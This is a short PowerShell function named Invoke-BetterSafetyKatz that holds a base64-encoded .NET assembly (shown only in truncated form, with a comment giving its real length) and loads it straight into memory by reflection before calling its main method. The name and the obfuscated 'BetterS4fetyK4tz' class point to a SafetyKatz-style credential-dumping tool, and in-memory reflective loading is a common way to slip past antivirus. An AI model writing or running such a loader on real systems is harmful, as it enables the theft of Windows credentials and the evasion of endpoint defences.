function Invoke-BetterSafetyKatz
{
    $base64binary="TVqQA...AAA=" # The omitted "TVqQA...AAA=" is actually a 137902-character long base64 string.
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [BetterS4fetyK4tz.Program]::main()
}
